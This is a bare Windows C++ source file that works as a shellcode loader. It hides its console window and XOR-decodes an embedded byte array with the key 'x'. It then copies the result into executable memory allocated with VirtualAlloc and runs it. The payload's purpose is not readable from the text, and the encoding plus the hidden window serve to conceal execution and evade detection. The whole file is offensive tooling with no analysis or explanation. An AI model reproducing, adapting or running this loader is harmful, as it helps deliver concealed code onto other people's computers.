
#include <windows.h>
#include <iostream>
int main(int argc, char **argv) {

ShowWindow(GetConsoleWindow(), SW_HIDE);

char b[] = {0xa2,0xa7,0xc0,0x6c,0xe1,0xc5,0x28,0xa0,0x0e,0x5c,0x8d,0x25,0x4b,0xb0,0xcb,0xc5,0x48,0x2d,0x60,0x7a,0x2d,0x60,0xfa,0xbd,0x68,0x03,0x30,0xf3,0xa4,0xd9,0xb9,0x71,0x53,0x93,0x0a,0xa3,0x42,0x33,0xa0,0x8a,0x0c,0x98,0x2c,0xfe,0x39,0x79,0xd1,0xb4,0x26,0x70,0xf6,0xa3,0xa2,0x0a,0x5a,0x15,0xe7,0x35,0xcd,0xc2,0x7f,0xc7,0xce,0xcb,0x9c,0x71,0xfa,0x78,0x68,0x37,0x6f,0x32,0x9b,0x02,0x2a,0x55,0x66,0x27,0x77,0x13,0x12,0x86,0xe3,0x2f,0x70,0x0e,0x07,0xa5,0x67,0xc2,0x0d,0x0c,0xf8,0x04,0x87,0x1b,0xdf,0xbb,0x0e,0xbb,0x83,0x57,0xed,0x54,0xee,0xf6,0x34,0x54,0xf5,0x07,0xbf,0xff,0xb2,0x45,0x7f,0xdd,0x44,0xf2,0x55,0x28,0xa1,0x27,0xa1,0xd3,0x37,0xa9,0x14,0x33,0x3e,0x5f,0xdb,0x6c,0x96,0x2f,0x1c,0x64,0xc0,0x40,0xa2,0xc2,0xbb,0x5d,0x67,0xb6,0x89,0xad,0x79,0xf7,0x65,0xf0,0x16,0x49,0x59,0xd3,0xdd,0x1f,0x14,0xb6,0x0f,0xce,0x2a,0x2c,0xef,0x61,0x47,0x7c,0x55,0x0e,0xa1,0xe0,0xa3,0xa9,0xf2,0x2e,0x35,0x0b,0xd2,0x7c,0x78,0x9a,0x12,0x32,0xc8,0xf9,0xcc,0x82,0xb9,0xdd,0x01,0x36,0xc3,0x78,0xf1,0x5f,0x17,0xe7,0x6d,0x40,0x95,0xfa,0x03,0x0c,0x44,0xfa,0xa2,0xe9,0x90,0x4b,0x84,0x7e,0xeb,0x70,0x8d,0xa4,0xcd,0x72,0xfd,0xad,0x4d,0x5f,0x00,0xba,0x57,0x46,0x31,0x75,0x37,0x3d,0x1f,0x8b,0x39,0xff,0x77,0xb9,0xef,0x3b,0x10,0x14,0xe9,0x95,0x7d,0xea,0xa6,0x15,0x9e,0xf6,0x36,0x03,0x8d,0xbe,0x69,0xdf,0x91,0x48,0x2a,0x96,0x73,0x93,0x9d,0xa7,0x96,0xf5,0x64,0xb5,0xfd,0xf2,0xb3,0x20,0xc8,0x70,0x52,0x0e,0x3f,0x38,0x9d,0x9e,0xfa,0x21,0xc9,0xbb,0xab,0x39,0x6b,0x13,0xfa,0xbc,0x3a,0x55,0x50,0x58,0xf2,0x90,0x91,0x3a,0x3a,0xbd,0xac,0xdb,0x99,0xa6,0x18,0x1b,0x15,0x78,0x7e,0xf0,0x41,0xf5,0xfe,0x0a,0x80,0x87,0x21,0x55,0x22,0x9e,0xbc,0xc0,0x81,0xde,0xe6,0x7d,0xcb,0x2c,0x41,0x1d,0xbc,0x32,0xe8,0xa3,0xe5,0x04,0xb3,0x11,0xe2,0x88,0xaf,0x10,0x9b,0x37,0xca,0x95,0x75,0x63,0xd9,0x18,0xe0,0x08,0x9b,0x99,0x00,0x0e,0x5b,0x48,0x3e,0x8b,0xd7,0xdd,0x70,0xdc,0xf3,0xeb,0x1f,0x7e,0x8e,0xce,0xe5,0x25,0x4b,0xea,0xb1,0x78,0x7f,0x0f,0x6d,0x2d,0xa0,0x0b,0xb9,0xf2,0x93,0x10,0xa5,0x66,0x33,0xb4,0x87,0x78,0x4d,0xb8,0xe2,0xc9,0xad,0x74,0xe2,0xc5,0x56,0xa3,0x81,0x6a,0x57,0x5e,0x19,0x32,0xf1,0x9f,0x67,0xd5,0x09,0xa0,0xc6,0x02,0xd7,0x3a,0x89,0x29,0x9b,0x6d,0x3a,0xa8,0x5e,0x3f,0x84,0x9f,0x96,0x7b,0x45,0xdc,0x2c,0x6b,0x99,0x4c,0xf2,0x25,0xe5,0xcd,0x1c,0x18,0x50,0xd5,0xa5,0xea,0x7e,0x6e,0xe3,0xf3,0x8e,0x23,0x35,0xbb,0xe7,0xd1,0xc7,0x32,0x52,0x37,0xb1,0x91,0xff,0x4d,0x1b,0xaa,0x81,0x6a,0xd2,0xc0,0xd0,0xdf,0xb8,0x78,0x96,0xb3,0x98,0x3c,0x52,0x7c,0x7a,0x6b,0x0d,0xda,0xa1,0x03,0x4f,0x11,0x7c,0xaa,0x56,0x99,0xed,0x43,0xd5,0x69,0xf0,0xcc,0x4c,0x46,0xeb,0x0b,0xfa,0xbc,0x82,0xf2,0x20,0x43,0x74,0xf4,0x32,0x13,0x24,0x13,0x45,0xf3,0xf4,0xd3,0x45,0x03,0xb6,0x59,0x57,0xf4,0xfc,0x8a,0x42,0x76,0xc5,0x43,0xbc,0xfa,0xd1,0xe2,0x77,0x8c,0xcc,0x96,0x7b,0x4a,0x33,0x02,0x1d,0xa0,0xb7,0xba,0xcb,0xca,0x59,0x63,0xf1,0x3c,0xa6,0x5a,0xbf,0x47,0x90,0x11,0x7c,0xde,0x6e,0x5e,0xa0,0x61,0x7f,0xf3,0xe3,0x67,0xc5,0x11,0x66,0x61,0xea,0x06,0xfa,0x4c,0xaa,0x10,0x9a,0x87,0x23,0xa5,0xfe,0x1d,0xef,0x31,0xfc,0x3c,0x56,0x70,0x75,0xdf,0x6f,0x0e,0x31,0xbc,0x6c,0xdb,0x8e,0x17,0x34,0x23,0x37,0x02,0xc0,0x6c,0x10,0xbe,0x6b,0x93,0xf8,0xa7,0x2e,0xd2,0x55,0xd0,0xbe,0xa4,0xad,0x51,0xb9,0xc7,0xc7,0xb9,0xff,0x3e,0x3e,0x61,0x3f,0x54,0xaf,0xba,0x32,0x1e,0xce,0x1d,0x6b,0x41,0xb4,0xbf,0x02,0xc4,0x7a,0x60,0x15,0x93,0x64,0xfe,0x7b,0x65,0xa6,0x07,0x8e,0x89,0xc2,0x7a,0xed,0x53,0xf3,0x1f,0x39,0x54,0xc4,0xd0,0x8d,0x14,0xf9,0x22,0xb0,0x85,0xb2,0x09,0x02,0xe3,0xea,0x18,0xd9,0x40,0xbc,0x75,0xaa,0xa7,0x72,0x99,0x44,0xf4,0x94,0xf2,0xa1,0x57,0x98,0x4a,0x1f,0x77,0x3e,0x23,0xad,0x59,0x97,0xa2,0x1c,0xd9,0x7f,0xde,0xbe,0xa8,0xfa,0x83,0x3e,0x21,0x58,0x40,0x1f,0x93,0xb2,0xe9,0xe2,0x29,0xee,0x8e,0xf0,0xdc,0x31,0x9a,0x07,0x06,0x91,0xee,0x9f,0x38,0xef,0x75,0x01,0x5e,0xa0,0x43,0x78,0x70,0x59,0xf2,0x41,0xd8,0x8a,0x99,0xa2,0x0a,0xdf,0xdb,0x74,0xe2,0x12,0xf2,0x17,0x27,0xb3,0xf3,0xaf,0xab,0xa0,0x99,0xfe,0xef,0x82,0x39,0xd1,0x38,0xcb,0x4e,0x85,0x09,0x5d,0xc1,0xe7,0x29,0xf5,0x2b,0x8f,0x24,0x95,0x64,0x11,0x56,0x14,0x86};

char c[sizeof b];
char x = 'x';
for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ x;}

void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

memcpy(exec, c, sizeof c);

((void(*)())exec)();

}
